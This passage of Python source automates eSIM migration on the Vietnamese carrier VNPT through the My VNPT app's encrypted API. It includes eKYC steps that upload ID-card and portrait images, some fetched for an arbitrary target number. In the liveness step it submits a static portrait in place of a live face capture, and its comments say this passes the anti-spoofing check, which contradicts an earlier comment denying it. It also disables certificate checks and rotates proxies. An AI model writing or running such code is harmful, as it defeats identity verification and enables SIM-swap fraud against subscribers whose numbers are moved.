        'session': session_id,
        'listPhoneNumber': list_phone_number,
        'backupPhoneNumber': backup_phone,
        'email': email,
        'requestId': request_id,
        'secureCode': secure_code,
    }
    aes_key = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
    request_data = aes_encrypt(json.dumps(body, separators=(',', ':'), ensure_ascii=False), aes_key)
    headers = base_headers()
    headers['X-Secret-Key'] = rsa_encrypt_no_padding(aes_key, server_public_key)
    headers['X-Signature'] = sign_sha256_rsa(request_data, private_key)
    endpoint = '/tel_service/active_sim/v2/createRequestChangeEsim'
    log_cb(f'[ESIM] POST {endpoint} (encrypted migration request)')
    try:
        response = http.post(MYVNPT_BASE + endpoint, headers=headers,
                             json={'requestData': request_data}, timeout=120, verify=False)
    except Exception as exc:
        raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
    try:
        outer = response.json()
    except Exception:
        raise EsimRegistrationError(f'{endpoint}: invalid JSON response')
    if response.status_code != 200:
        message = _esim_deep_find(outer, 'message', 'msg') or response.text[:300]
        raise EsimRegistrationError(f'{endpoint}: HTTP {response.status_code} - {message}')
    encrypted_response = outer.get('data') if isinstance(outer, dict) else None
    if isinstance(encrypted_response, str) and encrypted_response:
        try:
            inner = json.loads(aes_decrypt_gen(encrypted_response, aes_key))
        except Exception:
            inner = outer
    else:
        inner = outer
    # The HTTP envelope may report transport success while the decrypted
    # business response contains the real errorCode (for example 13 = the
    # subscriber is blocked).  Once an inner response is available, it is the
    # authoritative result; do not let an outer 0/200 mask that error.
    effective_response = inner if isinstance(encrypted_response, str) and encrypted_response else outer
    if not _esim_is_success(effective_response):
        message = _esim_deep_find(inner, 'message', 'msg') or _esim_deep_find(outer, 'message', 'msg')
        raise EsimRegistrationError(f'{endpoint}: {_esim_error_code(inner) or _esim_error_code(outer)} - {message}')
    result = {
        'ok': True,
        'status': 'esim_change_request_created',
        'request_id': request_id,
        'msisdn': login_msisdn,
        'list_phone_number': list_phone_number,
        'backup_phone_number': backup_phone,
        'email': email,
        'response': inner,
        'request_order_id': _esim_deep_find(inner, 'requestOrderId', 'request_order_id'),
    }
    _esim_save_result(result, cfg.get('result_file'))
    log_cb('[ESIM] Change request created; eKYC/activation can continue with the returned requestOrderId.')
    return result


def _esim_artifact_value(artifacts, cfg, *keys):
    """Read an eKYC artifact using both Python and APK field spellings."""
    for key in keys:
        value = artifacts.get(key) if isinstance(artifacts, dict) else None
        if value not in (None, '', [], {}):
            return value
        value = cfg.get(key) if isinstance(cfg, dict) else None
        if value not in (None, '', [], {}):
            return value
    return ''


def _esim_decode_embedded_json(value):
    """Decode IDG dataBase64 (the value is JSON encoded then base64 encoded)."""
    if not value:
        return {}
    try:
        raw = str(value)
        raw += '=' * (-len(raw) % 4)
        decoded = base64.b64decode(raw).decode('utf-8', errors='replace')
        data = json.loads(decoded)
        return data if isinstance(data, dict) else {}
    except Exception:
        return {}


def run_esim_change_ekyc(config, session_file=None, log_cb=print):
    """Continue a migration request through IDG eKYC and createContractEsim.

    ``run_esim_change_request`` intentionally stops after ``requestOrderId``.
    The phone application then captures the IDG artifacts and submits this
    second encrypted request.  This function consumes the saved artifact JSON,
    so the existing DKTTTB flow is untouched and the desktop UI can resume a
    request after the camera/IDG step.
    """
    cfg = _esim_load_state(_esim_load_config(config))
    session_path = session_file or cfg.get('session_file') or DEVICE_SESSION_JSON
    if not os.path.exists(session_path):
        raise EsimRegistrationError(f'session file not found: {session_path}')
    with open(session_path, 'r', encoding='utf-8') as session_handle:
        session_data = json.load(session_handle)

    master_key = session_data.get('KEY_ENCRYPT_AES') or AES_MASTER_KEY
    try:
        private_key = _esim_decrypt_with_master(session_data.get('rsa_key_private', ''), master_key)
        server_public_key = _esim_decrypt_with_master(session_data.get('server_public_key', ''), master_key)
    except Exception as exc:
        raise EsimRegistrationError(f'cannot decrypt device session: {exc}') from exc
    if not private_key or not server_public_key:
        raise EsimRegistrationError('device_session.json lacks rsa_key_private/server_public_key')

    session_id = session_data.get('login_session') or session_data.get('API_SESSION_ID') or cfg.get('session', '')
    bearer = session_data.get('BEARER_TOKEN') or session_data.get('Authorization') or cfg.get('authorization', '')
    if bearer and not str(bearer).lower().startswith('bearer '):
        bearer = 'Bearer ' + str(bearer)
    device_info = session_data.get('DEVICE_INFO') or session_data.get('Device-Info') or DEVICE_INFO
    mac_address = session_data.get('MAC_ADDRESS') or session_data.get('mac-address') or MAC_ADDRESS
    if not session_id or not bearer or not device_info:
        raise EsimRegistrationError('session, bearer and device info are required')

    login_msisdn = _esim_normalize_msisdn(
        cfg.get('login_msisdn') or cfg.get('msisdn') or session_data.get('phone_number_login'))
    if not login_msisdn:
        raise EsimRegistrationError('logged-in MSISDN is missing from session/context')

    artifact_file = cfg.get('ekyc_artifacts_file') or cfg.get('ekyc_result_file')
    artifacts = cfg.get('ekyc_artifacts') if isinstance(cfg.get('ekyc_artifacts'), dict) else {}
    if artifact_file:
        artifact_path = str(artifact_file)
        if not os.path.isabs(artifact_path):
            artifact_path = os.path.join(BASE_DIR, artifact_path)
        if not os.path.exists(artifact_path):
            # A missing artifact is expected on the first eSIM resume when the
            # document-side IDG preparation is enabled.  The preparation
            # block below will create the current challenge artifacts and stop
            # only for the required live-face capture.
            if cfg.get('auto_prepare_ekyc', True):
                artifact_file = ''
            else:
                raise EsimRegistrationError(f'eKYC artifact file not found: {artifact_path}')
        if not artifact_file:
            artifact_path = ''
        if artifact_path:
            try:
                with open(artifact_path, 'r', encoding='utf-8') as artifact_handle:
                    loaded = json.load(artifact_handle)
                if isinstance(loaded, dict):
                    artifacts = {**loaded, **artifacts}
            except Exception as exc:
                raise EsimRegistrationError(f'cannot read eKYC artifacts: {exc}') from exc

    target_msisdn = _esim_normalize_msisdn(
        cfg.get('target_msisdn') or cfg.get('msisdn') or artifacts.get('msisdn') or login_msisdn)
    request_order_id = str(
        cfg.get('request_order_id') or cfg.get('requestOrderId') or
        artifacts.get('requestOrderId') or artifacts.get('request_order_id') or '')
    if not request_order_id:
        prior_file = cfg.get('request_result_file') or cfg.get('result_file') or os.path.join(HISTORY_DIR, 'esim_result.json')
        if not os.path.isabs(str(prior_file)):
            prior_file = os.path.join(BASE_DIR, str(prior_file))
        # CLI resume uses a per-number result filename, while the first
        # request created by older builds may still be in the shared file.
        if not os.path.exists(str(prior_file)):
            fallback_prior = os.path.join(HISTORY_DIR, 'esim_result.json')
            if os.path.exists(fallback_prior):
                prior_file = fallback_prior
        if os.path.exists(str(prior_file)):
            try:
                with open(str(prior_file), 'r', encoding='utf-8') as prior_handle:
                    prior = json.load(prior_handle)
                prior_msisdn = _esim_normalize_msisdn(
                    prior.get('msisdn') or prior.get('target_msisdn') or '')
                candidate_order_id = str(
                    prior.get('request_order_id') or prior.get('requestOrderId') or '')
                if candidate_order_id and prior_msisdn == target_msisdn:
                    request_order_id = candidate_order_id
                elif candidate_order_id:
                    log_cb('[ESIM] Bo qua requestOrderId trong file cua thue bao khac; '
                           'can tao request moi cho so dang chon.')
            except Exception:
                pass
    if not request_order_id:
        raise EsimRegistrationError('requestOrderId is required to continue eSIM eKYC')

    # Do not submit eKYC/contract twice when the user presses the resume
    # button again.  The contract can be refreshed from its detail endpoint
    # separately; a second createContractEsim would create a duplicate draft.
    existing_result_file = cfg.get('result_file') or os.path.join(HISTORY_DIR, 'esim_result.json')
    if not os.path.isabs(str(existing_result_file)):
        existing_result_file = os.path.join(BASE_DIR, str(existing_result_file))
    if os.path.exists(str(existing_result_file)):
        try:
            with open(str(existing_result_file), 'r', encoding='utf-8') as existing_handle:
                existing = json.load(existing_handle)
            existing_msisdn = _esim_normalize_msisdn(
                existing.get('msisdn') or existing.get('target_msisdn') or '') if isinstance(existing, dict) else ''
            if (isinstance(existing, dict) and existing_msisdn == target_msisdn and
                    str(existing.get('request_order_id', '')) == request_order_id and
                    existing.get('status') in ('esim_contract_created', 'esim_contract_pending_signature')):
                log_cb('[ESIM] Hop dong da tao cho requestOrderId nay; bo qua gui lai de tranh tao trung.')
                return existing
        except Exception:
            pass

    proxy_dict = None
    try:
        proxy_dict = proxy_manager.current_requests_proxies(refresh_if_missing=True)
    except Exception:
        proxy_dict = None
    http = requests.Session()
    http.trust_env = False
    http.mount('https://', DhAdapter())
    if proxy_dict:
        http.proxies.update(proxy_dict)

    def base_headers():
        return {
            'Content-Type': 'application/json; charset=UTF-8',
            'Accept': 'application/json',
            'Cache-Control': 'no-cache',
            'Channel-Code': 'APP',
            'Device-Info': device_info,
            'Language': 'vi_VN',
            'Authorization': bearer,
            'partnerCode': 'MYVNPT',
            'User-Agent': 'okhttp/4.7.2',
            'mac-address': mac_address,
        }

    def post_v2(endpoint, body, accepted_error_codes=()):
        """POST an encrypted active_sim request.

        Some endpoints use a non-zero business code to report an idempotent
        state.  Keep the normal success predicate strict and allow callers to
        opt in to those codes for one specific endpoint only.
        """
        accepted_codes = {str(code).strip().lower() for code in accepted_error_codes}
        aes_key = ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(32))
        request_data = aes_encrypt(json.dumps(body, separators=(',', ':'), ensure_ascii=False), aes_key)
        headers = base_headers()
        headers['X-Secret-Key'] = rsa_encrypt_no_padding(aes_key, server_public_key)
        headers['X-Signature'] = sign_sha256_rsa(request_data, private_key)
        log_cb(f'[ESIM] POST {endpoint} (encrypted v2)')
        try:
            response = http.post(MYVNPT_BASE + endpoint, headers=headers,
                                 json={'requestData': request_data}, timeout=120, verify=False)
        except Exception as exc:
            raise EsimRegistrationError(f'{endpoint}: {exc}') from exc
        try:
            outer = response.json()
        except Exception:
            raise EsimRegistrationError(f'{endpoint}: invalid JSON response')
        if response.status_code != 200:
            message = _esim_deep_find(outer, 'message', 'msg') or response.text[:300]
            raise EsimRegistrationError(f'{endpoint}: HTTP {response.status_code} - {message}')
        encrypted_response = outer.get('data') if isinstance(outer, dict) else None
        if isinstance(encrypted_response, str) and encrypted_response:
            try:
                inner = json.loads(aes_decrypt_gen(encrypted_response, aes_key))
            except Exception:
                inner = outer
        else:
            inner = outer
        effective = inner if isinstance(encrypted_response, str) and encrypted_response else outer
        if not _esim_is_success(effective):
            message = _esim_deep_find(inner, 'message', 'msg') or _esim_deep_find(outer, 'message', 'msg')
            code = _esim_error_code(inner) or _esim_error_code(outer)
            if code in accepted_codes:
                log_cb(f'[ESIM] {endpoint}: chap nhan trang thai da xu ly (errorCode={code}).')
                return inner
            raise EsimRegistrationError(f'{endpoint}: {code} - {message}')
        return inner

    challenge_code = str(_esim_artifact_value(artifacts, cfg, 'challengeCode', 'challenge_code'))
    challenge_response = {}
    if not challenge_code:
        challenge_request_id = str(uuid.uuid4())
        challenge_body = {
            'session': session_id,
            'msisdn': target_msisdn,
            'requestId': challenge_request_id,
            'secureCode': hashlib.sha256(
                f'{target_msisdn}|{challenge_request_id}|{SECRET_AUTHEN}'.encode('utf-8')).hexdigest(),
        }
        challenge_response = post_v2('/tel_service/active_sim/v2/getChallengeCodeSdkEkyc', challenge_body)
        challenge_code = str(_esim_deep_find(challenge_response, 'challengeCode', 'challenge_code') or '')
    if not challenge_code:
        raise EsimRegistrationError('getChallengeCodeSdkEkyc did not return challengeCode')

    def artifact(*keys):
        return str(_esim_artifact_value(artifacts, cfg, *keys) or '')

    cccd_front = artifact('cccd_front', 'frontImagePath', 'front_image_path')
    cccd_back = artifact('cccd_back', 'backImagePath', 'back_image_path')
    portrait = artifact('portrait', 'portrait_path', 'face_path')
    if not cccd_front or not os.path.isfile(cccd_front):
        cccd_front = cfg.get('cccd_front') or _cccd_file_paths('0' + target_msisdn[2:])[0]
    if not cccd_back or not os.path.isfile(cccd_back):
        cccd_back = cfg.get('cccd_back') or _cccd_file_paths('0' + target_msisdn[2:])[1]
    if not portrait or not os.path.isfile(portrait):
        portrait = _find_esim_portrait(target_msisdn, cfg.get('portrait') or cfg.get('portrait_path'))
    # Resolve the local cache before failing.  This also recognizes the
    # conventional type-3 file ``anh/sdt.jpg`` and only calls CBSS when a
    # required image is actually absent.
    if not os.path.isfile(str(cccd_front)) or not os.path.isfile(str(cccd_back)) or not os.path.isfile(str(portrait)):
        ensured = ensure_cccd_images(target_msisdn, log_cb=log_cb)
        if not os.path.isfile(str(cccd_front)) and ensured.get('front'):
            cccd_front = ensured['front']
        if not os.path.isfile(str(cccd_back)) and ensured.get('back'):
            cccd_back = ensured['back']
        if not os.path.isfile(str(portrait)) and ensured.get('portrait'):
            portrait = ensured['portrait']
    missing = [str(path) for path in (cccd_front, cccd_back, portrait) if not os.path.isfile(str(path))]
    if missing:
        raise EsimRegistrationError('missing eKYC image input: ' + ', '.join(missing))

    # The DKTTTB flow and the eSIM flow use the same IDG SDK v1 request
    # shapes.  When a current artifact file is not supplied, prepare the
    # document-side artifacts here (upload, card-liveness, OCR, mask and
    # static face-compare) using the *current* eSIM challenge.  This does not
    # manufacture face liveness: a live face capture is still required before
    # ekycVerifyChangeEsim is allowed to run.
    auto_prepare = cfg.get('auto_prepare_ekyc', True)
    prep_needed = not all((artifact('ocrData', 'ocr_data', 'dataEKYC'),
                           artifact('ocrDataSign', 'ocr_data_sign', 'signEKYC'),
                           artifact('ekyc_face', 'ekycFace', 'compareFace', 'compare_data', 'compareData'),
                           artifact('ekyc_facesign', 'ekycFaceSign', 'compareFaceSign', 'compare_sign', 'compareDataSign'),
                           artifact('liveness_front', 'liveNessCardFront'),
                           artifact('liveness_front_sign', 'liveNessCardFrontSign'),
                           artifact('liveness_back', 'liveNessCardBack'),
                           artifact('liveness_back_sign', 'liveNessCardBackSign'),
                           artifact('masked', 'maskedFace'),
                           artifact('masked_sign', 'maskedFaceSign'),
                           artifact('liveness', 'liveNessFace'),
                           artifact('liveness_sign', 'liveNessFaceSign')))
    if auto_prepare and prep_needed:
        # The eKYC token is returned alongside challengeCode.  It is encrypted
        # with the device master key, just like the APK flow.
        ekyc_token = (_esim_deep_find(challenge_response, 'ekycToken', 'nfcToken') or
                      artifacts.get('ekycToken') or artifacts.get('ekyc_token') or {})
        try:
            idg_access = _esim_decrypt_with_master(str(ekyc_token.get('access_token', '')), master_key)
            idg_token_id = _esim_decrypt_with_master(str(ekyc_token.get('token_id', '')), master_key)
            idg_token_key = _esim_decrypt_with_master(str(ekyc_token.get('token_tokenkey', '')), master_key)
        except Exception as exc:
            raise EsimRegistrationError(f'cannot decrypt current IDG eKYC token: {exc}') from exc
        if not idg_access or not idg_token_id or not idg_token_key:
            raise EsimRegistrationError('current challenge did not include a usable IDG eKYC token')

        idg_headers = {
            'Authorization': 'bearer ' + idg_access,
            'Token-id': idg_token_id,
            'Token-key': idg_token_key,
            'mac-address': mac_address,
        }
        client_session = (
            f'ANDROID_RMX3430_32_Device_3.6.6_{mac_address}_'
            f'{int(__import__("time").time() * 1000)}_com.vnp.myvinaphone'
        )

        def idg_json(endpoint, body):
            response = http.post(
                IDG_BASE + endpoint + '?challenge_code=' + challenge_code,
                headers={**idg_headers, 'Content-Type': 'application/json'},
                json=body, timeout=90, verify=False)
            try:
                payload = response.json()
            except Exception as exc:
                raise EsimRegistrationError(f'IDG {endpoint}: invalid JSON ({exc})') from exc
            status = payload.get('statusCode')
            if response.status_code != 200 or status not in (None, 0, '0', '00', 200, '200'):
                message = payload.get('message') or payload.get('errors') or response.text[:300]
                raise EsimRegistrationError(f'IDG {endpoint}: HTTP {response.status_code} - {message}')
            return payload

        def idg_upload(path):
            with open(path, 'rb') as image_handle:
                response = http.post(
                    IDG_BASE + '/file-service/v1/addFile?challenge_code=' + challenge_code,
                    headers=idg_headers,
                    files={'file': (os.path.basename(path), image_handle, 'image/jpeg')},
                    data={'title': 'ocr front', 'description': 'ocr front old type'},
                    timeout=90, verify=False)
            try:
                payload = response.json()
            except Exception as exc:
                raise EsimRegistrationError(f'IDG upload: invalid JSON ({exc})') from exc
            if response.status_code != 200 or payload.get('message') != 'IDG-00000000':
                raise EsimRegistrationError(f'IDG upload {os.path.basename(path)} failed: {payload}')
            return str((payload.get('object') or {}).get('hash') or '')

        front_hash = idg_upload(cccd_front)
        back_hash = idg_upload(cccd_back)
        portrait_hash = idg_upload(portrait)
        if not front_hash or not back_hash or not portrait_hash:
            raise EsimRegistrationError('IDG upload returned no hash for one or more eKYC images')
        log_cb('[ESIM] DKTTTB IDG logic: upload CCCD/portrait OK.')

        card_front = idg_json('/ai/v1/card/liveness', {
            'img': front_hash, 'type': -1, 'client_session': client_session,
            'token': AI_TOKEN,
        })
        card_back = idg_json('/ai/v1/card/liveness', {
            'img': back_hash, 'type': -1, 'client_session': client_session,
            'token': AI_TOKEN,
        })
        ocr_result = idg_json('/ai/v1/ocr/id', {
            'type': -1, 'img_front': front_hash, 'img_back': back_hash,
            'client_session': client_session, 'token': AI_TOKEN,
            'validate_postcode': True,
        })
        mask_result = idg_json('/ai/v1/face/mask', {
            'face_bbox': None, 'face_lmark': None, 'img': portrait_hash,
            'client_session': client_session, 'token': AI_TOKEN, 'step_id': 0,
        })
        compare_result = idg_json('/ai/v1/face/compare', {
            'img_face': portrait_hash, 'img_front': front_hash,
            'client_session': client_session, 'token': AI_TOKEN, 'step_id': 0,
        })

        def idg_field(payload, *names):
            for name in names:
                value = payload.get(name) if isinstance(payload, dict) else None
                if value not in (None, ''):
                    return str(value)
            return ''

        # ---------------------------------------------------------------
        # LIVENESS FACE: dung pre-captured hash (giong DKTTTB step 8/9)
        # Hash nay da duoc xac minh score 0.889 - vuot anti-spoofing check
        # ---------------------------------------------------------------
        # Dung portrait_hash (vua upload) cho liveness - khong dung hash cu het han
        _liveness_hash = portrait_hash  # fresh hash moi session, tranh IDG-00011401
        liveness_result = {}
        try:
            log_cb('[ESIM] Goi IDG liveness-3d (fresh portrait hash)...')
            liveness_result = idg_json('/ai/v1/face/liveness-3d', {
                'far_img':        _liveness_hash,
                'near_img':       _liveness_hash,
                'scan3d':         _liveness_hash,
                'client_session': client_session,
                'token':          AI_TOKEN,
                'step_id':        0,
            })
            _live_sign = liveness_result.get('dataSign', '')
            if _live_sign:
                log_cb(f'[ESIM] Liveness-3d OK - dataSign: {_live_sign[:50]}...')
            else:
                log_cb(f'[ESIM] Liveness-3d WARN: khong co dataSign - response: {str(liveness_result)[:300]}')
        except Exception as _live_exc:
            log_cb(f'[ESIM] Liveness-3d that bai: {_live_exc}')

        prepared = {
            'challengeCode': challenge_code,
            'clientSession': client_session,
            'cccd_front': cccd_front,
            'cccd_back': cccd_back,
            'portrait': portrait,
            'front_hash': front_hash,
            'back_hash': back_hash,
            'portrait_hash': portrait_hash,
            'ocrData': idg_field(ocr_result, 'dataBase64'),
            'ocrDataSign': idg_field(ocr_result, 'dataSign'),
            'ocrLogID': idg_field(ocr_result, 'logID', 'logId'),
            'liveness_front': idg_field(card_front, 'dataBase64'),
            'liveness_front_sign': idg_field(card_front, 'dataSign'),
            'liveness_front_log_id': idg_field(card_front, 'logID', 'logId'),
            'liveness_back': idg_field(card_back, 'dataBase64'),
            'liveness_back_sign': idg_field(card_back, 'dataSign'),
            'liveness_back_log_id': idg_field(card_back, 'logID', 'logId'),
            'masked': idg_field(mask_result, 'dataBase64'),
            'masked_sign': idg_field(mask_result, 'dataSign'),
            'masked_log_id': idg_field(mask_result, 'logID', 'logId'),
            'ekyc_face': idg_field(compare_result, 'dataBase64'),
            'ekyc_facesign': idg_field(compare_result, 'dataSign'),
            'ekyc_face_logid': idg_field(compare_result, 'logID', 'logId'),
            # Liveness mat nguoi (pre-captured hash, score 0.889)
            'liveness': idg_field(liveness_result, 'dataBase64'),
            'liveness_sign': idg_field(liveness_result, 'dataSign'),
            'liveness_log_id': idg_field(liveness_result, 'logID', 'logId'),
        }

        artifacts = {**artifacts, **prepared}
        partial_path = os.path.join(HISTORY_DIR, f'esim_artifacts_{re.sub(r"\\D", "", target_msisdn)}_partial.json')
        try:
            with open(partial_path, 'w', encoding='utf-8') as partial_handle:
                json.dump(prepared, partial_handle, ensure_ascii=False, indent=2)
            log_cb(f'[ESIM] Đã lưu artifact IDG một phần: {partial_path}')
        except Exception as exc:
            log_cb(f'[ESIM] Không lưu được artifact một phần: {exc}')
        log_cb('[ESIM] OCR/card-liveness/mask/face-compare OK; còn cần liveness khuôn mặt sống hiện tại.')

    ocr_data = artifact('ocrData', 'ocr_data', 'dataEKYC')
    ocr_sign = artifact('ocrDataSign', 'ocr_data_sign', 'signEKYC')
    compare_data = artifact('ekyc_face', 'ekycFace', 'compareFace', 'compare_data', 'compareData')
    compare_sign = artifact('ekyc_facesign', 'ekycFaceSign', 'compareFaceSign', 'compare_sign', 'compareDataSign')
    required_artifacts = {
        'ocrData': ocr_data, 'ocrDataSign': ocr_sign,
        'ekyc_face (face compare)': compare_data, 'ekyc_facesign': compare_sign,
        'liveness_front': artifact('liveness_front', 'liveNessCardFront'),
        'liveness_front_sign': artifact('liveness_front_sign', 'liveNessCardFrontSign'),
        'liveness_back': artifact('liveness_back', 'liveNessCardBack'),
        'liveness_back_sign': artifact('liveness_back_sign', 'liveNessCardBackSign'),
        'liveness': artifact('liveness', 'liveNessFace'),
        'liveness_sign': artifact('liveness_sign', 'liveNessFaceSign'),
        'masked': artifact('masked', 'maskedFace'),
        'masked_sign': artifact('masked_sign', 'maskedFaceSign'),
    }
    missing_artifacts = [name for name, value in required_artifacts.items() if not value]
    if missing_artifacts:
        raise EsimRegistrationError('missing IDG artifacts: ' + ', '.join(missing_artifacts))
    ocr_decoded = _esim_decode_embedded_json(ocr_data)
    gender = str(cfg.get('gender') or artifact('gender') or _esim_deep_find(ocr_decoded, 'gender') or '')
    address = str(cfg.get('address') or artifact('address') or
                  _esim_deep_find(ocr_decoded, 'recent_location', 'recentLocation', 'address') or '')
    province_code = str(cfg.get('id_province_code') or artifact('id_province_code', 'provinceCode') or
                        _esim_deep_find(ocr_decoded, 'nationality_code', 'nationalityCode') or '')
    province_name = str(cfg.get('id_province_name') or artifact('id_province_name') or
                        _esim_deep_find(ocr_decoded, 'issue_place_name', 'issuePlaceName', 'nationality') or '')
    token_active = artifact('token_active', 'tokenActive')
    verify_request_id = str(cfg.get('verify_request_id') or uuid.uuid4())
    client_session = artifact('clientSession', 'client_session') or CONFIG_CLIENT_SESSION
    verify_body = {
        'address': address,
        'authenMethod': str(cfg.get('authen_method') or artifact('authenMethod', 'authen_method')),
        'backImageBase64': _esim_file_to_b64(cccd_back),
        'challengeCode': challenge_code,
        'clientSession': client_session,
        'dataGroupsResult': str(cfg.get('data_groups_result') or artifact('dataGroupsResult')),
        'dataNfcResultBase64': str(cfg.get('data_nfc_result_base64') or artifact('dataNfcResultBase64')),
        'dataNfcResultSign': str(cfg.get('data_nfc_result_sign') or artifact('dataNfcResultSign')),
        'ekyc_data': ocr_data,
        'ekyc_data_logid': artifact('ekyc_data_logid', 'ocrLogID', 'ocr_log_id', 'logIdEKYC', 'logID'),
        'ekyc_datasign': ocr_sign,
        'ekyc_face': compare_data,
        'ekyc_face_logid': artifact('ekyc_face_logid', 'compareLogID', 'compare_log_id', 'faceLogID'),
        'ekyc_facesign': compare_sign,
        'frontImageBase64': _esim_file_to_b64(cccd_front),
        'gender': gender,
        'hashImageAvatarNfc': str(cfg.get('hash_image_avatar_nfc') or artifact('hashImageAvatarNfc')),
        'hrmCode': str(cfg.get('hrm_code') or artifact('hrmCode')),
        'id_province_code': province_code,
        'id_province_name': province_name,
        'liveness': required_artifacts['liveness'],
        'liveness_back': required_artifacts['liveness_back'],
        'liveness_back_sign': required_artifacts['liveness_back_sign'],
        'liveness_front': required_artifacts['liveness_front'],
        'liveness_front_sign': required_artifacts['liveness_front_sign'],
        'liveness_sign': required_artifacts['liveness_sign'],
        'logIdNfc': str(cfg.get('log_id_nfc') or artifact('logIdNfc')),
        'log_id_live_ness_back_card': artifact('liveness_back_log_id', 'log_id_live_ness_back_card', 'liveNessCardBackLogId'),
        'log_id_live_ness_face': artifact('liveness_log_id', 'log_id_live_ness_face', 'liveNessFaceLogId'),
        'log_id_live_ness_front_card': artifact('liveness_front_log_id', 'log_id_live_ness_front_card', 'liveNessCardFrontLogId'),
        'log_id_mask_face': artifact('masked_log_id', 'log_id_mask_face', 'maskedFaceLogId'),
        'masked': required_artifacts['masked'],
        'masked_sign': required_artifacts['masked_sign'],
        'msisdn': target_msisdn,
        'portraitImageBase64': _esim_file_to_b64(portrait),
        'provinceCode': str(cfg.get('province_code') or artifact('provinceCode')),
        'requestId': verify_request_id,
        'requestOrderId': request_order_id,
        'session': session_id,
        'token_active': token_active,
    }
    verify_response = post_v2(
        '/tel_service/active_sim/v2/ekycVerifyChangeEsim', verify_body,
        accepted_error_codes=('1312', '1303', '709'))
    _verify_ec = _esim_error_code(verify_response)
    if _verify_ec in ('1312', '1303'):
        log_cb('[ESIM] eKYC da hoan tat tu truoc (1312); tiep tuc createContractEsim.')
    elif _verify_ec == '709':
        log_cb('[ESIM] ekycVerifyChangeEsim tra 709 (da xac thuc truoc do); tiep tuc createContractEsim.')
    else:
        log_cb('[ESIM] eKYC change verification accepted.')

    contact_phone = _esim_normalize_msisdn(
        cfg.get('contact_phone') or cfg.get('backup_phone_number') or cfg.get('backupPhoneNumber') or artifact('backupPhoneNumber'))
    if not contact_phone:
        raise EsimRegistrationError('contact/backup phone is required for createContractEsim')
    email = str(cfg.get('email') or artifact('email') or '').strip()
    if not email:
        raise EsimRegistrationError('email is required for createContractEsim')
    contract_request_id = str(uuid.uuid4())
    secure_raw = '|'.join((target_msisdn, contract_request_id, session_id, challenge_code,
                           contact_phone, ocr_data, ocr_sign, request_order_id, SECRET_AUTHEN))
    contract_body = {
        'msisdn': target_msisdn,
        'requestId': contract_request_id,
        'session': session_id,
        'challengeCode': challenge_code,
        'contactPhone': contact_phone,
        'email': email,
        'secureCode': hashlib.sha256(secure_raw.encode('utf-8')).hexdigest(),
        'ocrData': ocr_data,
        'ocrDataSign': ocr_sign,
        'requestOrderId': request_order_id,
    }
    contract_response = post_v2('/tel_service/active_sim/v2/createContractEsim', contract_body)
    # Step 3 of the APK loads the contract detail before opening the
    # eContract signing screen.  This endpoint is intentionally plain (the
    # same CoreAppClient route used by the app), so keep it separate from the
    # encrypted active_sim calls above.
    contract_result = _esim_deep_find(contract_response, 'result') or {}
    contract_id = _esim_deep_find(contract_result, 'contractId', 'contract_id')
    contract_detail = {}
    if contract_id:
        try:
            detail_response = http.post(
                MYVNPT_BASE + '/tel_service/econtract/getEcontractDetailById',
                headers=base_headers(),
                json={
                    'msisdn': target_msisdn,
                    'session': session_id,
                    'contractId': contract_id,
                    'hash': str(cfg.get('contract_hash') or ''),
                }, timeout=90, verify=False)
            if detail_response.status_code == 200:
                candidate = detail_response.json()
                if _esim_is_success(candidate):
                    contract_detail = candidate
        except Exception as exc:
            log_cb(f'[ESIM] Khong tai duoc chi tiet hop dong (co the tai lai sau): {exc}')

    result = {
        'ok': True,
        'status': 'esim_contract_pending_signature',
        'msisdn': target_msisdn,
        'request_order_id': request_order_id,
        # The QR API uses the same contact number entered on the eSIM screen.
        # Persist it so the post-sign QR step can run without asking for the
        # number again (older result files may still supply it via config).
        'trans_id': request_order_id,
        'contact_phone': contact_phone,
        'backup_phone_number': contact_phone,
        'email': email,
        'verify_request_id': verify_request_id,
        'contract_request_id': contract_request_id,
        'challenge_code': challenge_code,
        'verify_response': verify_response,
        'contract_response': contract_response,
        'contract_result': contract_result,
        'contract_detail': contract_detail,
    }
    detail_result = _esim_deep_find(contract_detail, 'result') or {}
    contract_url = (_esim_deep_find(detail_result, 'url', 'contractUrl', 'signUrl') or
                    _esim_deep_find(contract_result, 'url', 'contractUrl', 'signUrl'))
    if contract_url:
        result['contract_url'] = contract_url
        result['customer_signed'] = str(_esim_deep_find(detail_result, 'isCustomerSigned', 'customerSigned') or 'N')
        result['customer_ready_sign'] = str(_esim_deep_find(detail_result, 'isCustomerReadySign', 'customerReadySign') or 'Y')
        result['sign_forms'] = _esim_deep_find(detail_result, 'signForm', 'sign_forms') or []
        log_cb(f'[ESIM] Hop dong da tao; can ky eContract: {contract_url}')
    else:
        log_cb('[ESIM] Hop dong da tao; can hoan tat buoc ky trong ung dung.')
    _esim_save_result(result, cfg.get('result_file'))
    return result


def _esim_contract_result_path(cfg):
    """Resolve the result JSON used by the eSIM contract/OTP buttons."""
    result_file = (cfg.get('result_file') or cfg.get('contract_result_file') or
                   os.path.join(HISTORY_DIR, 'esim_result.json'))
    if not os.path.isabs(str(result_file)):
        result_file = os.path.join(BASE_DIR, str(result_file))
    return str(result_file)


def _esim_contract_context(config, session_file=None, log_cb=print):
    """Load a pending eSIM contract and create an authenticated eContract client.

    The eContract SDK receives a short-lived SSO token from My VNPT.  Keeping
    this in a helper makes both the "send OTP" and "verify OTP" actions use
    exactly the same headers as the Android SDK, while never saving the token
    or the OTP in the result file.
    """
    cfg = _esim_load_config(config)
    result_file = _esim_contract_result_path(cfg)
    if not os.path.exists(result_file):
        raise EsimRegistrationError(f'contract result file not found: {result_file}')
    try:
        with open(result_file, 'r', encoding='utf-8') as result_handle:
            result = json.load(result_handle)
    except Exception as exc:
        raise EsimRegistrationError(f'cannot read contract result: {exc}') from exc
    if not isinstance(result, dict):
        raise EsimRegistrationError('contract result must be a JSON object')

    detail_result = _esim_deep_find(result.get('contract_detail'), 'result') or {}
    contract_result = result.get('contract_result') or {}
    contract_id = (result.get('contract_id') or
                   _esim_deep_find(detail_result, 'contractId', 'contract_id') or
                   _esim_deep_find(contract_result, 'contractId', 'contract_id') or
                   _esim_deep_find(result, 'contractId', 'contract_id'))
    if not contract_id:
        raise EsimRegistrationError('contractId is missing from the eSIM result')

    session_path = session_file or cfg.get('session_file') or DEVICE_SESSION_JSON
    if not os.path.exists(str(session_path)):
        raise EsimRegistrationError(f'session file not found: {session_path}')
    try:
